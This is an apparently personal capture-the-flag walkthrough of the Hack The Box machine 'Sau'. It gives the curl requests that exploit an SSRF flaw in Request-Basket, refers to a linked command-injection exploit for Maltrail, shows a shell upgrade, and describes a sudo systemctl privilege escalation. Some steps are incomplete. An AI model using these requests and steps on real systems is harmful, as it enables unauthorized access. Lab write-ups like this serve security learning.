Sau is easy rated Hack The Box machine, Sharing a walkthrough based on notes I took a while back. They might be a bit rough, but hopefully still helpful. 

## Common Enumeration 
### Nmap
I started by running an `nmap -p- -sC -sV -oA recon/nmap --open 10.10.11.224` scan which found two open ports:

- Port 22 (SSH)
- Port 55555

```bash
$ nmap -p- -sC -sV -oA recon/nmap --open 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.26s latency).
Not shown: 55545 closed tcp ports (reset), 9988 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

### Service Enumeration on Port 55555

On port 55555, I found that the service running is `Request-Basket` version 1.2.1.

### Vulnerability Discovery and Exploitation

After some googling, I found that `Request-Basket` version 1.2.1 is vulnerable to Server-Side Request Forgery (SSRF) identified as [CVE-2023-27163](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3). This can be exploited via the `/api/baskets/{name}` endpoint. I created a new basket named `testing123`.

```bash
curl -X POST -d '{"forward_url": "http://127.0.0.1:80/login","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}' -H
'Content-Type: application/json' http://10.10.11.224:55555/api/baskets/testing123 -v
```

To verify if the forwarding worked, I ran the following `curl` command:

```bash
curl http://10.10.11.224:55555/testing123 -v
```

This found that the server is running `Maltrail` version 0.53.

### Exploiting Maltrail for Remote Code Execution

I found a [weaponized exploit](https://github.com/spookier/Maltrail-v0.53-Exploit) for `Maltrail` v0.53 that leverages an unauthenticated OS command injection vulnerability in the `username` parameter

Using this exploit, I was able to gain a shell as the `puma` user.

## Shell as puma

I upgraded my shell using Python to make it more stable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

### User Flag Capture

Got the `user.txt` flag

```text
puma@sau:~$ cat user.txt                                                                                                                                         
86****************************e8
```

## Privilege Escalation

For privilege escalation, I first checked for any low-hanging fruit. I found that the `puma` user could run `/usr/bin/systemctl status trail.service` with sudo permissions. So, I ran the command with sudo privileges:

```bash
sudo /usr/bin/systemctl status trail.service
```

### Root Flag

Then, got the `root.txt` flag

```text
# cat /root/root.txt

```
